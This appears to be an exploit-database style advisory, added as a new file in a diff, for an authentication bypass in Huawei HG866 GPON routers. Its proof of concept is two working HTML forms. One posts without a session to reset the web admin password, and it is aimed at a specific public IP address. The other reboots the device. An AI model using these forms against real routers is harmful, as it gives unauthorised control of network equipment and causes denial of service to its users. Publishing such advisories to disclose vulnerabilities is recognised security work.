@@ -1,0 +1,26 @@
+# Exploit Title: Huawei HG866 Authentication Bypass
+# Date: Jun 14 2012
+# Exploit Author: hkm
+# Vendor Homepage: http://www.huawei.com
+# Version: V1R2C01SPC202, R3.2.4.92sbn - R3.4.2.257sbn, 3FE53864AOCB16
+# Tested on: HG866GTA_VER.C, 01, 02
+# Advisory: http://websec.mx/advisories/view/Evasion_de_autenticacion_en_Huawei_HG866
+
+Huawei HG866 GPON routers don't properly validate the session on every page. It is possible to change the web interface admin password by performing an unauthenticated post directly to the form.
+
+PoC / Exploit:
+
+<!--Changes root password --!>
+<form name=hg866bypass action=http://187.162.144.50/html/password.html method=post >
+<input name=psw value=password ><input name=reenterpsw value=password >
+<input type="submit" name="save" value="Apply" />
+</form>
+
+<!--Reboots the device --!>
+<form name=hg866dos action=http://192.168.100.251/html/admin_reboot.html" method="post">
+<input type=submit name=save id=save value=Reboot />
+</form>
+
+
+
+hkm
